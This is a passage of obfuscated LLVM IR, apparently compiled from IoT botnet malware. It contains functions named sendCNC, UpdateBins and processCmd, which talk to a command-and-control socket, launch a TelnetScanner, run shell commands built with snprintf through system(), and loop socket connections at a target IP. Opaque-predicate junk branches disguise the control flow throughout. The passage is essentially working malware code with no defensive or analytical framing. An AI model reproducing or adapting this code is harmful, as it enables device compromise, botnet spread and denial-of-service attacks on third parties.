  %51 = load i8*, i8** %8, align 8
  %52 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %48, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.505, i32 0, i32 0), i8* %49, i8* %50, i8* %51) #2
  %53 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %54 = call i32 @system(i8* %53)
  br label %55

; <label>:55:                                     ; preds = %47, %originalBBpart2
  %56 = load i32, i32* @x.97
  %57 = load i32, i32* @y.98
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i8*, i8** %5, align 8
  %65 = call i32 @strcmp(i8* %64, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0)) #10
  %66 = icmp ne i32 %65, 0
  %67 = load i32, i32* @x.97
  %68 = load i32, i32* @y.98
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %66, label %83, label %75

; <label>:75:                                     ; preds = %originalBBpart24
  %76 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i32 0, i32 0
  %77 = load i8*, i8** %6, align 8
  %78 = load i8*, i8** %7, align 8
  %79 = load i8*, i8** %8, align 8
  %80 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %76, i64 128, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.507, i32 0, i32 0), i8* %77, i8* %78, i8* %79) #2
  %81 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i32 0, i32 0
  %82 = call i32 @system(i8* %81)
  br label %83

; <label>:83:                                     ; preds = %75, %originalBBpart24
  %84 = load i8*, i8** %5, align 8
  %85 = call i32 @strcmp(i8* %84, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0)) #10
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %95, label %87

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i32 0, i32 0
  %89 = load i8*, i8** %6, align 8
  %90 = load i8*, i8** %7, align 8
  %91 = load i8*, i8** %8, align 8
  %92 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %88, i64 128, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.509, i32 0, i32 0), i8* %89, i8* %90, i8* %91) #2
  %93 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i32 0, i32 0
  %94 = call i32 @system(i8* %93)
  br label %95

; <label>:95:                                     ; preds = %87, %83
  %96 = load i8*, i8** %5, align 8
  %97 = call i32 @strcmp(i8* %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #10
  %98 = icmp ne i32 %97, 0
  br i1 %98, label %107, label %99

; <label>:99:                                     ; preds = %95
  %100 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i32 0, i32 0
  %101 = load i8*, i8** %6, align 8
  %102 = load i8*, i8** %7, align 8
  %103 = load i8*, i8** %8, align 8
  %104 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %100, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.511, i32 0, i32 0), i8* %101, i8* %102, i8* %103) #2
  %105 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i32 0, i32 0
  %106 = call i32 @system(i8* %105)
  br label %107

; <label>:107:                                    ; preds = %99, %95
  %108 = load i32, i32* @x.97
  %109 = load i32, i32* @y.98
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %107
  %116 = load i8*, i8** %5, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  %119 = load i32, i32* @x.97
  %120 = load i32, i32* @y.98
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %118, label %135, label %127

; <label>:127:                                    ; preds = %originalBBpart28
  %128 = getelementptr inbounds [128 x i8], [128 x i8]* %14, i32 0, i32 0
  %129 = load i8*, i8** %6, align 8
  %130 = load i8*, i8** %7, align 8
  %131 = load i8*, i8** %8, align 8
  %132 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %128, i64 128, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.513, i32 0, i32 0), i8* %129, i8* %130, i8* %131) #2
  %133 = getelementptr inbounds [128 x i8], [128 x i8]* %14, i32 0, i32 0
  %134 = call i32 @system(i8* %133)
  br label %135

; <label>:135:                                    ; preds = %127, %originalBBpart28
  %136 = load i32, i32* @x.97
  %137 = load i32, i32* @y.98
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %135
  %144 = load i8*, i8** %5, align 8
  %145 = call i32 @strcmp(i8* %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0)) #10
  %146 = icmp ne i32 %145, 0
  %147 = load i32, i32* @x.97
  %148 = load i32, i32* @y.98
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %146, label %163, label %155

; <label>:155:                                    ; preds = %originalBBpart212
  %156 = getelementptr inbounds [128 x i8], [128 x i8]* %15, i32 0, i32 0
  %157 = load i8*, i8** %6, align 8
  %158 = load i8*, i8** %7, align 8
  %159 = load i8*, i8** %8, align 8
  %160 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %156, i64 128, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.515, i32 0, i32 0), i8* %157, i8* %158, i8* %159) #2
  %161 = getelementptr inbounds [128 x i8], [128 x i8]* %15, i32 0, i32 0
  %162 = call i32 @system(i8* %161)
  br label %163

; <label>:163:                                    ; preds = %155, %originalBBpart212
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %164 = load i8*, i8** %5, align 8
  %165 = call i32 @strcmp(i8* %164, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0)) #10
  %166 = icmp ne i32 %165, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %167 = load i8*, i8** %5, align 8
  %168 = call i32 @strcmp(i8* %167, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0)) #10
  %169 = icmp ne i32 %168, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %107
  %170 = load i8*, i8** %5, align 8
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0)) #10
  %172 = icmp ne i32 %171, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %135
  %173 = load i8*, i8** %5, align 8
  %174 = call i32 @strcmp(i8* %173, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0)) #10
  %175 = icmp ne i32 %174, 0
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.99
  %5 = load i32, i32* @y.100
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %18 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %19 = load i32, i32* %14, align 4
  %20 = add nsw i32 %18, %19
  store i32 %20, i32* %15, align 4
  %21 = load i8*, i8** %12, align 8
  %22 = call i32 @inet_addr(i8* %21) #2
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %24 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %23, i32 0, i32 0
  store i32 %22, i32* %24, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %13, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 zeroext %27) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = load i32, i32* @x.99
  %31 = load i32, i32* @y.100
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart29, %originalBBpart2
  %39 = load i32, i32* %15, align 4
  %40 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %41 = icmp sgt i32 %39, %40
  br i1 %41, label %42, label %66

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @x.99
  %44 = load i32, i32* @y.100
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %42
  %51 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %51, i32* %16, align 4
  %52 = load i32, i32* %16, align 4
  %53 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 @sleep(i32 1)
  %56 = load i32, i32* %16, align 4
  %57 = call i32 @close(i32 %56)
  %58 = load i32, i32* @x.99
  %59 = load i32, i32* @y.100
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %38

; <label>:66:                                     ; preds = %38
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %67 = alloca i8*, align 8
  %68 = alloca i32, align 4
  %69 = alloca i32, align 4
  %70 = alloca i32, align 4
  %71 = alloca i32, align 4
  %72 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %67, align 8
  store i32 %1, i32* %68, align 4
  store i32 %2, i32* %69, align 4
  %73 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %74 = load i32, i32* %69, align 4
  %_ = shl i32 %73, %74
  %_1 = sub i32 %73, %74
  %gen = mul i32 %_1, %74
  %_2 = sub i32 0, %73
  %gen3 = add i32 %_2, %74
  %_4 = shl i32 %73, %74
  %_5 = sub i32 %73, %74
  %gen6 = mul i32 %_5, %74
  %75 = add nsw i32 %73, %74
  store i32 %75, i32* %70, align 4
  %76 = load i8*, i8** %67, align 8
  %77 = call i32 @inet_addr(i8* %76) #2
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %72, i32 0, i32 2
  %79 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %78, i32 0, i32 0
  store i32 %77, i32* %79, align 4
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %72, i32 0, i32 0
  store i16 2, i16* %80, align 4
  %81 = load i32, i32* %68, align 4
  %82 = trunc i32 %81 to i16
  %83 = call zeroext i16 @htons(i16 zeroext %82) #13
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %72, i32 0, i32 1
  store i16 %83, i16* %84, align 2
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %42
  %85 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %85, i32* %16, align 4
  %86 = load i32, i32* %16, align 4
  %87 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %88 = call i32 @connect(i32 %86, %struct.sockaddr* %87, i32 16)
  %89 = call i32 @sleep(i32 1)
  %90 = load i32, i32* %16, align 4
  %91 = call i32 @close(i32 %90)
  br label %originalBB7
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() #0 {
  %1 = alloca i32, align 4
  %2 = call i32 @fork() #2
  store i32 %2, i32* %1, align 4
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %0
  %5 = call i32 @system(i8* getelementptr inbounds ([439 x i8], [439 x i8]* @.str.516, i32 0, i32 0))
  %6 = call i32 @sleep(i32 20)
  br label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* %1, align 4
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.517, i32 0, i32 0), i32 %8)
  br label %10

; <label>:10:                                     ; preds = %7, %4
  %11 = load i32, i32* @x.101
  %12 = load i32, i32* @y.102
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* @x.101
  %20 = load i32, i32* @y.102
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  br label %originalBB
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i8*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca i32, align 4
  %49 = alloca i32, align 4
  %50 = alloca i8*, align 8
  %51 = alloca i8*, align 8
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0)) #10
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %79, label %62

; <label>:62:                                     ; preds = %2
  %63 = load i32, i32* @x.103
  %64 = load i32, i32* @y.104
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %62
  %71 = load i32, i32* @x.103
  %72 = load i32, i32* @y.104
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %1829

; <label>:79:                                     ; preds = %2
  %80 = load i32, i32* @x.103
  %81 = load i32, i32* @y.104
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %79
  %88 = load i8**, i8*** %4, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 0
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 @strcmp(i8* %90, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.518, i32 0, i32 0)) #10
  %92 = icmp ne i32 %91, 0
  %93 = load i32, i32* @x.103
  %94 = load i32, i32* @y.104
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %92, label %118, label %101

; <label>:101:                                    ; preds = %originalBBpart24
  %102 = load i32, i32* @x.103
  %103 = load i32, i32* @y.104
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %101
  %110 = load i32, i32* @x.103
  %111 = load i32, i32* @y.104
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %1829

; <label>:118:                                    ; preds = %originalBBpart24
  %119 = load i8**, i8*** %4, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 0
  %121 = load i8*, i8** %120, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.519, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %141, label %124

; <label>:124:                                    ; preds = %118
  %125 = load i32, i32* @x.103
  %126 = load i32, i32* @y.104
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %124
  call void (i32, ...) bitcast (void ()* @UpdateBins to void (i32, ...)*)(i32 1)
  %133 = load i32, i32* @x.103
  %134 = load i32, i32* @y.104
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %1829

; <label>:141:                                    ; preds = %118
  %142 = load i8**, i8*** %4, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 0
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 @strcmp(i8* %144, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.520, i32 0, i32 0)) #10
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %287, label %147

; <label>:147:                                    ; preds = %141
  %148 = load i8**, i8*** %4, align 8
  %149 = getelementptr inbounds i8*, i8** %148, i64 1
  %150 = load i8*, i8** %149, align 8
  %151 = call i32 @strcmp(i8* %150, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.521, i32 0, i32 0)) #10
  %152 = icmp ne i32 %151, 0
  br i1 %152, label %178, label %153

; <label>:153:                                    ; preds = %147
  %154 = load i32, i32* @scanPid, align 4
  %155 = icmp eq i32 %154, 0
  br i1 %155, label %156, label %173

; <label>:156:                                    ; preds = %153
  %157 = load i32, i32* @x.103
  %158 = load i32, i32* @y.104
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %156
  %165 = load i32, i32* @x.103
  %166 = load i32, i32* @y.104
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %1829

; <label>:173:                                    ; preds = %153
  %174 = load i32, i32* @scanPid, align 4
  %175 = call i32 @kill(i32 %174, i32 9) #2
  %176 = load i32, i32* @mainCommSock, align 4
  %177 = call i32 (i32, i8*, ...) @sockprintf(i32 %176, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %178

; <label>:178:                                    ; preds = %173, %147
  %179 = load i32, i32* @x.103
  %180 = load i32, i32* @y.104
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %178
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 1
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @strcmp(i8* %189, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.523, i32 0, i32 0)) #10
  %191 = icmp ne i32 %190, 0
  %192 = load i32, i32* @x.103
  %193 = load i32, i32* @y.104
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %191, label %286, label %200

; <label>:200:                                    ; preds = %originalBBpart220
  %201 = load i32, i32* @x.103
  %202 = load i32, i32* @y.104
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %200
  %209 = load i32, i32* @scanPid, align 4
  %210 = icmp ne i32 %209, 0
  %211 = load i32, i32* @x.103
  %212 = load i32, i32* @y.104
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %210, label %219, label %220

; <label>:219:                                    ; preds = %originalBBpart224
  br label %1829

; <label>:220:                                    ; preds = %originalBBpart224
  %221 = call i32 @fork() #2
  store i32 %221, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %222 = load i32, i32* %5, align 4
  %223 = icmp ugt i32 %222, 0
  br i1 %223, label %224, label %242

; <label>:224:                                    ; preds = %220
  %225 = load i32, i32* @x.103
  %226 = load i32, i32* @y.104
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %224
  %233 = load i32, i32* %5, align 4
  store i32 %233, i32* @scanPid, align 4
  %234 = load i32, i32* @x.103
  %235 = load i32, i32* @y.104
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %1829

; <label>:242:                                    ; preds = %220
  %243 = load i32, i32* %5, align 4
  %244 = icmp eq i32 %243, -1
  br i1 %244, label %245, label %246

; <label>:245:                                    ; preds = %242
  br label %1829

; <label>:246:                                    ; preds = %242
  %247 = load i32, i32* @x.103
  %248 = load i32, i32* @y.104
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %246
  %255 = load i32, i32* @x.103
  %256 = load i32, i32* @y.104
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %263

; <label>:263:                                    ; preds = %originalBBpart232
  %264 = load i32, i32* @x.103
  %265 = load i32, i32* @y.104
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %263
  %272 = load i32, i32* @mainCommSock, align 4
  %273 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %274 = call i8* @inet_ntoa(i32 %273) #2
  %275 = call i32 (i32, i8*, ...) @sockprintf(i32 %272, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.524, i32 0, i32 0), i8* %274)
  %276 = load i32, i32* %7, align 4
  %277 = load i32, i32* %6, align 4
  call void @TelnetScanner(i32 %276, i32 %277)
  call void @_exit(i32 0) #12
  %278 = load i32, i32* @x.103
  %279 = load i32, i32* @y.104
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  unreachable

; <label>:286:                                    ; preds = %originalBBpart220
  br label %287

; <label>:287:                                    ; preds = %286, %141
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 0
